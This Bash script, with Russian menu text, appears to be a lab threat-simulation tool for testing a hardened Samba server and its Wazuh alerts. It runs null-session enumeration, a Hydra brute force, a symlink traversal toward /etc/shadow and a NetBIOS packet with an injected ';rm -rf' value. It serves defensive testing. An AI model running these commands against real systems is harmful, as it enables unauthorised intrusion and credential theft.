#!/bin/bash

VICTIM_IP="192.168.1.21"
TARGET_USER="vsftpd"


RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

clear
echo -e "${CYAN}===================================================================${NC}"
echo -e "${CYAN} ИНТЕРАКТИВНЫЙ МЕНЕДЖЕР СИМУЛЯЦИИ УГРОЗ ДЛЯ SAMBA (SMBv2/v3) ${NC}"
echo -e "${CYAN}===================================================================${NC}"
echo -e "Адрес машины-жертвы (SMB-сервер): ${GREEN}${VICTIM_IP}${NC}"
echo ""
echo "Выберите тип угрозы для воспроизведения на стенде:"
echo "1) Анонимный сбор данных через IPC$-интерфейс (Null Session)"
echo "2) Распределенный брутфорс учетных записей Samba (Hydra)"
echo "3) Имитация обхода директории (Symlink Traversal / CVE-2019-10197)"
echo "4) Имитация деструктивного пакета NetBIOS (Симуляция RCE CVE-2025-10230)"
echo "5) Выход из меню"
echo -e "${CYAN}------------------------------------------------------------------=${NC}"
read -p "Введите номер действия (1-5): " CHOICE

case $CHOICE in
    1)
        echo -e "\n${RED}[!] Запуск разведки через анонимное IPC$-подключение...${NC}"
        smbclient //"$VICTIM_IP"/IPC$ -N -U "" -c "shares; localstat" 2>&1
        
        echo -e "\n${GREEN}[+] Запрос отправлен. При restrict anonymous = 2 сервер вернет NT_STATUS_ACCESS_DENIED.${NC}"
        echo -e "${CYAN}[*] Проверьте /var/log/samba/log.smbd на наличие заблокированных Null-сессий.${NC}"
        ;;
        
    2)
        echo -e "\n${RED}[!] Запуск атаки Brute-Force на протокол SMB...${NC}"
        echo "Создание временного словаря паролей..."
        echo -e "wrong_smb_pass1\nwrong_smb_pass2\nwrong_smb_pass3" > /tmp/smb_pass.txt
        
        hydra -l "$TARGET_USER" -P /tmp/smb_pass.txt smb://"$VICTIM_IP" -V -t 1
        
        rm -f /tmp/smb_pass.txt
        echo -e "\n${GREEN}[+] Симуляция брутфорса завершена.${NC}"
        echo -e "${CYAN}[*] Проверьте консоль Wazuh на срабатывание правила множественных ошибок аутентификации.${NC}"
        ;;
        
    3)
        echo -e "\n${RED}[!] Имитация атаки Symlink Traversal (Побег из директории)...${NC}"
        echo "Создание вредоносной символической ссылки, указывающей за пределы шары..."
        
        echo -e "${CYAN}[*] Отправка команды создания ссылки на системный объект ОС...${NC}"
        smbclient //"$VICTIM_IP"/PublicShare -U "$TARGET_USER" -c "symlink /etc/shadow escaped_shadow" 2>&1
        
        echo -e "\n${GREEN}[+] Попытка инъекции ссылки завершена.${NC}"
        echo -e "${CYAN}[*] Параметры 'wide links = no' и 'unix extensions = no' заставят сервер отклонить чтение этого объекта.${NC}"
        ;;
        
    4)
        echo -e "\n${RED}[!] Симуляция аномального запроса NetBIOS Name Query (CVE-2025-10230)...${NC}"
        echo "Отправка специально сформированного некорректного пакета NetBIOS..."
        
        nmblookup -A ';rm -rf /tmp/test_wins_hook;' "$VICTIM_IP" > /dev/null 2>&1
        
        for i in {1..5}; do
            echo -ne "\x80\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x20\x43\x41\x43\x41\x43\x41" > /dev/udp/"$VICTIM_IP"/137 2>/dev/null
        done
        
        echo -e "${GREEN}[+] Пакеты симуляции Wins Hook отправлены.${NC}"
        echo -e "${CYAN}[*] Так как у нас 'wins support = no', демон nmbd в безопасности и просто залогирует аномалию.${NC}"
        ;;
        
    5)
        echo -e "\n${GREEN}Выход из менеджера симуляции Samba.${NC}"
        exit 0
        ;;
        
    *)
        echo -e "\n${RED}[–] Неверный выбор. Укажите число от 1 до 5.${NC}"
        ;;
esac
